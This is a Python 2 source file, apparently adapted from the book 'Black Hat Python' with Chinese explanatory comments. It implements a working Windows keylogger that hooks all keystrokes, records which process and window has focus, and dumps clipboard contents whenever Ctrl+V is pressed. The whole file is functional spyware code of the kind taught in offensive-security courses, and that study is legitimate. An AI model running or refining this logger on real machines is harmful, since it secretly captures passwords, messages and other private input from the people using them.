#coding:utf-8

#code from <Black Hat Python>

from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    hwnd = user32.GetForegroundWindow()   #获取前台句柄
    pid = c_ulong(0)  #获得进程pid
    user32.GetWindowThreadProcessId(hwnd,byref(pid))
    process_id = '%d' % pid.value  #保存pid
    executeable = create_string_buffer("\x00" * 512)  #申请内存
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executeable), 512)
    window_title = create_string_buffer("\x00" * 512)  #读取窗口标题
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    print
    print "[PID : %s  -  %s  -  %s]" % (process_id, executeable.value, window_title.value)
    print

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)   #关闭句柄

def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:   #是否切换窗口
        current_window = event.WindowName
        get_current_process()
    if event.Ascii > 32 and event.Ascii < 127:  #检测是否为常规按键，非组合键
        print chr(event.Ascii)
    else:
        if event.Key == 'V':  #读取 Ctrl+V 时剪贴板内容
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print '[PASTE]  -  %s' % pasted_value
        else:
            print '[%s]' % event.Key
    return True  #返回直到下次钩子触发，不返回则按键被丢弃，不正常执行

#创建钩子函数管理器
k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke
#注册钩子，循环执行
k1.HookKeyboard()
pythoncom.PumpMessages()